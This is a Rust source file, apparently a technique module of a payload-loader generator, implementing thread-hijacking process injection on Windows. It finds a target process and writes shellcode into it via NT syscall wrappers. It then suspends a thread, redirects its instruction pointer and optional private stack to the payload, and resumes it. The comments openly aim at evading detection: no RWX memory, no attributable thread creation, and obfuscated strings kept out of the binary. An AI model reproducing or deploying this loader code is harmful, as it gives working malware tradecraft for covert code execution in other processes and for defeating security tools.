// --- Thread hijacking (technique fragment) ---
//
// This file is injected verbatim into the generated stub's `mod step_<index>`
// when the technique is selected, so it is self-contained: its own `use`
// statements, constants and helpers, all resolved inside that module.
//
// Per-build values use the technique's placeholder tokens, substituted by
// `Params::render_fragment_for` (see `mod.rs`); the tokens are not valid Rust
// identifiers, so nothing can rewrite them silently. Do not switch back to
// double-brace placeholders: those are valid Rust (nested blocks), and tooling
// reformats them into something the substitution no longer matches.
//
// The flow:
//
//   1. Find the target: either the configured `pid`, or the first running
//      process whose image name matches `target` (ToolHelp snapshots — userland
//      enumeration, like `GetModuleHandleA`, not a syscall the stub issues).
//      `nt_open_process` then opens it with the rights the rest needs.
//   2. `nt_alloc_vm` a `PAGE_READWRITE` region in the target (never RWX),
//      `nt_write_vm` the payload into it and `nt_protect_vm` it to
//      read+execute. All of this happens *before* any thread is touched, so the
//      window in which the target is frozen stays as short as possible.
//   3. Pick a thread of the target, suspend it (`nt_suspend_thread`), read its
//      context (`nt_get_context_thread`), point the instruction pointer at the
//      payload, write the context back (`nt_set_context_thread`) and resume it
//      (`nt_resume_thread`). The thread was never created by the loader, so no
//      thread-creation call is attributable to it.
//   4. Optionally wait — bounded by `wait_ms` — for the target to exit, to read
//      its exit code back and relay it.
//
// Two contracts this fragment has to respect, both documented in the README:
//
//   - The payload is entered as if it had been `call`ed by the hijacked thread,
//     so it must be position-independent code. With `dedicated_stack: true` the
//     thread has no caller to return to: a payload that returns jumps to a null
//     return address and takes the target down (the README explains why that is
//     the default). With `dedicated_stack: false` the payload runs on the
//     target's own stack and may return into the frame the thread was suspended
//     in — if it does not clobber it first.
//   - The payload runs in *another* process, so its own exit code is only
//     observable through the target's. The loader reports the target's exit
//     status when it exits inside the configured window.
//
// Every diagnostic goes through a message placeholder (rebuilt at run time by
// the renderer), and so does the target name: none of them may appear in the
// artifact's `.rdata`.
//
// The `nt_*` helpers are safe wrappers around their own `unsafe` internals, so
// only the Win32 calls really need an `unsafe` block here.

use core::ffi::c_void;
use core::ptr;

use windows::Win32::Foundation::{BOOL, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FLAGS};
#[cfg(target_arch = "x86_64")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64;
#[cfg(target_arch = "x86")]
use windows::Win32::System::Diagnostics::Debug::CONTEXT_FULL_X86;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, Thread32First, Thread32Next,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD, THREADENTRY32,
};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::{
    GetExitCodeProcess, OpenThread, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT,
    THREAD_SUSPEND_RESUME,
};

/// `STILL_ACTIVE`: the value Windows reports for a process that has not exited.
/// Returned when the target's exit was not observed — no wait was requested, or
/// the bounded wait timed out. (A target that genuinely exits with 259 is
/// indistinguishable; the debug log is the authority.)
const STILL_ACTIVE: i32 = 259;

/// `WAIT_TIMEOUT`/`STATUS_TIMEOUT` (`0x102`): the bounded wait expired. The two
/// syscall-layer modes agree on the value.
const WAIT_TIMEOUT_CODE: i32 = 0x102;

/// How much address space the private stack reserves for the payload. One
/// megabyte is what a default thread stack gets.
const PRIVATE_STACK_SIZE: usize = 0x10_0000;

/// `SYNCHRONIZE` (`0x00100000`): a generic access right with the same numeric
/// value for every object type. Nothing in the `windows` bindings maps it to
/// `PROCESS_ACCESS_RIGHTS`, and `nt_wait_for_single_object` needs it on the
/// process handle, so it is spelled out here.
const PROCESS_SYNCHRONIZE: u32 = 0x0010_0000;

/// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT` on
/// x64; the `windows` binding only guarantees 8, so force it here. (x86 has no
/// such requirement; the alignment is harmless there.)
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// `CONTEXT_FULL` for the stub's architecture: what the hijack reads and writes.
#[cfg(target_arch = "x86_64")]
const CONTEXT_FLAGS_FULL: CONTEXT_FLAGS = CONTEXT_FULL_AMD64;
#[cfg(target_arch = "x86")]
const CONTEXT_FLAGS_FULL: CONTEXT_FLAGS = CONTEXT_FULL_X86;

/// `OBJECT_ATTRIBUTES` (`ntdef.h`), as `nt_open_process` needs it. Only the
/// length matters for a relative-free open.
#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *const c_void,
    attributes: u32,
    security_descriptor: *const c_void,
    security_quality_of_service: *const c_void,
}

/// `CLIENT_ID` (`ntdef.h`): which process (or thread) `nt_open_process` opens.
#[repr(C)]
struct ClientId {
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
}

/// Appends a status to a label (which is rebuilt from obfuscated bytes at the
/// call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// The NUL-terminated UTF-16 field as a `String` (the ToolHelp name fields).
fn nul_terminated(wide: &[u16]) -> String {
    let len = wide.iter().position(|c| *c == 0).unwrap_or(wide.len());
    String::from_utf16_lossy(&wide[..len])
}

/// The image name part of a path (`C:\Windows\System32\notepad.exe` →
/// `notepad.exe`). A bare name is returned unchanged.
fn image_name(path: &str) -> &str {
    path.rsplit(['\\', '/']).next().unwrap_or(path)
}

/// The first running process whose image name equals `wanted`
/// (case-insensitively), or an error naming the requirement.
fn find_process(wanted: &str) -> Result<u32, String> {
    let wanted = image_name(wanted);
    // SAFETY: the snapshot handle is checked by the error path, the entry struct
    // is sized per the API contract (`dwSize`) and every string read from it is
    // bounded by the fixed field length.
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }
        .map_err(|_| $MSG_SNAPSHOT_FAILED$)?;

    let mut entry = PROCESSENTRY32W::default();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

    let mut found = None;
    let mut more = unsafe { Process32FirstW(snapshot, &mut entry) }.is_ok();
    while more {
        if nul_terminated(&entry.szExeFile).eq_ignore_ascii_case(wanted) {
            found = Some(entry.th32ProcessID);
            break;
        }
        more = unsafe { Process32NextW(snapshot, &mut entry) }.is_ok();
    }
    let _ = crate::nt_close(snapshot);

    found.ok_or_else(|| $MSG_NO_TARGET$)
}

/// The first thread of `pid`, or an error naming the requirement.
///
/// The first entry a snapshot returns is used as-is. A *waiting* thread would be
/// the gentler choice — parked inside a wait, with a return address on its stack
/// that leads back into the wait loop — but finding one means parsing the
/// per-thread wait reasons out of `SystemProcessInformation`, a large
/// version-dependent structure the loader does not otherwise need. The README
/// documents the choice and what it costs a *returning* payload with
/// `dedicated_stack: false`.
fn find_thread(pid: u32) -> Result<u32, String> {
    // SAFETY: as in `find_process`.
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }
        .map_err(|_| $MSG_SNAPSHOT_FAILED$)?;

    let mut entry = THREADENTRY32::default();
    entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;

    let mut found = None;
    let mut more = unsafe { Thread32First(snapshot, &mut entry) }.is_ok();
    while more {
        if entry.th32OwnerProcessID == pid {
            found = Some(entry.th32ThreadID);
            break;
        }
        more = unsafe { Thread32Next(snapshot, &mut entry) }.is_ok();
    }
    let _ = crate::nt_close(snapshot);

    found.ok_or_else(|| $MSG_NO_THREAD$)
}

/// Opens `pid` with the rights the hijack needs: allocate and write memory.
fn open_process(pid: u32) -> Result<HANDLE, String> {
    let attributes = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null_mut(),
        object_name: ptr::null(),
        attributes: 0,
        security_descriptor: ptr::null(),
        security_quality_of_service: ptr::null(),
    };
    let client_id = ClientId {
        unique_process: pid as usize as *mut c_void,
        unique_thread: ptr::null_mut(),
    };

    let mut handle: isize = 0;
    let status = crate::nt_open_process(
        &mut handle as *mut isize as *mut c_void,
        (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION).0 | PROCESS_SYNCHRONIZE,
        &attributes as *const ObjectAttributes as *const c_void,
        &client_id as *const ClientId as *const c_void,
    );
    if status < 0 {
        return Err(nt_error($MSG_OPEN_PROCESS_FAILED$, status));
    }
    Ok(HANDLE(handle as *mut c_void))
}

/// Writes `image` into a fresh, read+execute region of `process` and returns its
/// base address. The region is never writable and executable at once.
fn place_payload(process: HANDLE, image: &[u8]) -> Result<*mut c_void, String> {
    let mut base: *mut c_void = ptr::null_mut();
    let mut region = image.len();
    let status = crate::nt_alloc_vm(
        process,
        &mut base,
        0,
        &mut region,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 {
        return Err(nt_error($MSG_ALLOC_FAILED$, status));
    }

    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        base as *const c_void,
        image.as_ptr() as *const c_void,
        image.len(),
        &mut written,
    );
    if status < 0 {
        return Err(nt_error($MSG_WRITE_FAILED$, status));
    }
    if written != image.len() {
        // A partial write would leave the thread executing whatever follows the
        // copied prefix. Never resume for this.
        return Err($MSG_WRITE_SHORT$);
    }

    // Read+execute is enough for a code blob and is the quieter pair than RWX. A
    // payload that needs to write to its own image is out of scope.
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        process,
        base,
        region,
        PAGE_EXECUTE_READ.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(nt_error($MSG_PROTECT_FAILED$, status));
    }
    Ok(base)
}

/// Reserves a private stack for the payload and returns the `Rsp`/`Esp` the
/// thread should start with.
///
/// The returned pointer is the slot a `ret` reads (it holds zero), so a payload
/// that returns faults at a null instruction pointer instead of walking into the
/// target's own frames (or into uncommitted memory). It is also what a `call`
/// would have left: the x64 ABI expects `rsp % 16 == 8` at a function's first
/// instruction.
fn private_stack(process: HANDLE) -> Result<u64, String> {
    let mut base: *mut c_void = ptr::null_mut();
    let mut size = PRIVATE_STACK_SIZE;
    let status = crate::nt_alloc_vm(
        process,
        &mut base,
        0,
        &mut size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 {
        return Err(nt_error($MSG_STACK_FAILED$, status));
    }

    // The stack grows down: start near the top, 16-byte aligned, with eight bytes
    // of slack so the entry slot itself is mapped.
    let top = (base as usize + size - 0x10) & !0xf;
    let entry = top - 8;
    let null = [0u8; 8];
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        entry as *const c_void,
        null.as_ptr() as *const c_void,
        null.len(),
        &mut written,
    );
    if status < 0 {
        return Err(nt_error($MSG_STACK_FAILED$, status));
    }
    Ok(entry as u64)
}

/// Suspends `thread`, points it at `entry` (with `stack` as its stack pointer
/// when the caller asked for a private one) and resumes it.
fn hijack(thread: HANDLE, entry: *mut c_void, stack: Option<u64>) -> Result<(), String> {
    let mut previous = 0u32;
    let status = crate::nt_suspend_thread(thread, &mut previous);
    if status < 0 {
        return Err(nt_error($MSG_SUSPEND_FAILED$, status));
    }

    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
    let status = crate::nt_get_context_thread(thread, &mut ctx.0 as *mut CONTEXT as *mut c_void);
    if status < 0 {
        // Leaving the thread suspended would freeze the target for good.
        let _ = crate::nt_resume_thread(thread, ptr::null_mut());
        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
    }

    #[cfg(target_arch = "x86_64")]
    {
        ctx.0.Rip = entry as u64;
        if let Some(stack) = stack {
            ctx.0.Rsp = stack;
        }
    }
    #[cfg(target_arch = "x86")]
    {
        ctx.0.Eip = entry as u32;
        if let Some(stack) = stack {
            ctx.0.Esp = stack as u32;
        }
    }

    let status = crate::nt_set_context_thread(thread, &mut ctx.0 as *mut CONTEXT as *mut c_void);
    if status < 0 {
        let _ = crate::nt_resume_thread(thread, ptr::null_mut());
        return Err(nt_error($MSG_SET_CONTEXT_FAILED$, status));
    }

    let status = crate::nt_resume_thread(thread, ptr::null_mut());
    if status < 0 {
        return Err(nt_error($MSG_RESUME_FAILED$, status));
    }
    Ok(())
}

/// Adapter expected by the stub skeleton: finds a thread in the configured
/// target process, redirects it to the payload and resumes it.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The format guard is substituted as a boolean literal: `true` for a
    // shellcode payload, `false` otherwise. The branch body still has to
    // type-check in both cases, so the (obfuscated) message is substituted either
    // way and folded away when the branch is dead.
    if !$SUPPORTED_FORMAT$ {
        return Err($MSG_UNSUPPORTED_FORMAT$);
    }
    if image.is_empty() {
        return Err($MSG_EMPTY$);
    }

    let pid = match $PID_DEF$ {
        Some(pid) => pid,
        None => {
            let target: String = $TARGET_DEF$;
            find_process(&target)?
        }
    };
    let thread_id = find_thread(pid)?;
    let process = open_process(pid)?;

    crate::tech_dbg!(
        "thread_hijacking",
        "target pid {} thread {}",
        pid,
        thread_id
    );

    // Everything that touches the target's memory happens before the thread is
    // suspended, so the freeze window is one context round trip.
    let result = place_payload(process, image).and_then(|entry| {
        let stack = if $DEDICATED_STACK$ {
            Some(private_stack(process)?)
        } else {
            None
        };
        // SAFETY: `OpenThread` only takes the access mask, an inherit flag and the
        // thread id; the handle it returns is closed before returning.
        let thread = unsafe {
            OpenThread(
                THREAD_SUSPEND_RESUME
                    | THREAD_GET_CONTEXT
                    | THREAD_SET_CONTEXT
                    | THREAD_QUERY_INFORMATION,
                BOOL(0),
                thread_id,
            )
            .map_err(|e| nt_error($MSG_OPEN_THREAD_FAILED$, e.code().0))?
        };

        crate::tech_dbg!(
            "thread_hijacking",
            "payload at {entry:p} ({} bytes), thread {:#x} suspended",
            image.len(),
            thread.0 as usize
        );

        let hijacked = hijack(thread, entry, stack);
        let _ = crate::nt_close(thread);
        hijacked
    });
    if let Err(error) = result {
        // Every later path closes the target handle; the error path must too.
        let _ = crate::nt_close(process);
        return Err(error);
    }

    if $WAIT_MS$ == 0 {
        // Fire and forget: the target's exit cannot be observed later, and a real
        // payload is expected to keep it alive.
        let _ = crate::nt_close(process);
        return Ok(STILL_ACTIVE);
    }

    // Waiting on the *process* (not the hijacked thread) catches both a payload
    // that calls `ExitProcess` and one that crashes the target.
    let status = crate::nt_wait_for_single_object(process, $WAIT_MS$);
    if status == WAIT_TIMEOUT_CODE {
        crate::tech_dbg!(
            "thread_hijacking",
            "the target is still running after {} ms (the payload may be alive)",
            $WAIT_MS$
        );
        let _ = crate::nt_close(process);
        return Ok(STILL_ACTIVE);
    }
    if status != 0 {
        let _ = crate::nt_close(process);
        return Err(nt_error($MSG_WAIT_FAILED$, status));
    }

    let mut code = 0u32;
    // SAFETY: the process handle is open with query rights and `code` is a live
    // out-parameter.
    let exit = unsafe { GetExitCodeProcess(process, &mut code) }
        .map_err(|e| nt_error($MSG_EXIT_CODE_FAILED$, e.code().0));
    let _ = crate::nt_close(process);
    exit?;
    crate::tech_dbg!(
        "thread_hijacking",
        "the target exited with status 0x{:08X} while the loader waited",
        code
    );
    Ok(code as i32)
}
